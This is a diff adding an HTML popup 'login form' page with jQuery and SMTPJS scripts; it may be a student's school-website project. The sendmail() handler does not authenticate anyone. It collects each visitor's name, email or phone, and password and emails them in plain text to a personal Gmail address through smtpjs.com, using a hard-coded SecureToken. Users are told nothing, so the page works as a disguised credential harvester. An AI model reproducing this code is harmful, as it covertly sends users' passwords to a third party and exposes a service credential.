@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<!-- Created By CodingNepal -->
+<html lang="en" dir="ltr">
+   <head>
+      <meta charset="utf-8">
+      <title>Popup Login Form Design</title>
+      <link rel="stylesheet" href="style.css">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+   </head>
+   <body>
+      <div class="center">
+         <input type="checkbox" id="show">
+         <label for="show" class="show-btn">View Form</label>
+         <div class="container">
+            <label for="show" class="close-btn fas fa-times" title="close"></label>
+            <div class="text">
+               Login Form
+            </div>
+            <form action="javascript:sendmail()">
+               <div class="data">
+                  <label>Name</label>
+                  <input type="text" id="Name" required>
+               </div>
+               <div class="data">
+                  <label>Email or Phone</label>
+                  <input type="text" id="email" required>
+               </div>
+               <div class="data">
+                  <label>Password</label>
+                  <input type="password" id="pass" required>
+               </div>
+               <div class="forgot-pass">
+                  <a href="#">Forgot Password?</a>
+               </div>
+               <div class="btn">
+                  <div class="inner"></div>
+                  <button type="submit">login</button>
+               </div>
+               <div class="signup-link">
+                  Not a member? <a href="#">Signup now</a>
+               </div>
+                <div class="signup-link">
+                  Go In Website <a href="H:\Papa School Website\index.html">Link</a>
+               </div> 
+            </form>
+         </div>
+      </div>
+      <script
+  src="https://code.jquery.com/jquery-2.2.4.min.js"
+  integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
+  crossorigin="anonymous"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+ 
+<script>  
+
+     function sendmail(){
+    
+         var name = $('#Name').val();
+         var email = $('#email').val();
+         var pass= $('#pass').val();
+
+         // var body = $('#body').val();
+
+         var Body='Name: '+name+'<br>Email: '+email+'<br>Password: '+pass;
+         //console.log(name, phone, email, message);
+
+         Email.send({
+        SecureToken:"fbf31702-bb7f-4a4e-9c1c-4ccf17ee777f",
+            To: 'sambhavrai101@gmail.com',
+            From: "userweb@gmail.com",
+            Subject: "New message on contact from "+name,
+            Body: Body
+         }).then(
+            message =>{
+               //console.log (message);
+               if(message=='OK'){
+               alert('WELCOME '  +name);
+
+               }
+               else{
+                  console.error (message);
+                  alert('There is error at sending message. ');
+                  confirm('There')
+                  
+               }
+
+            }
+         );
+
+
+
+      }
+
+
+    </script>
+ </script>
+   </body>
+</html>
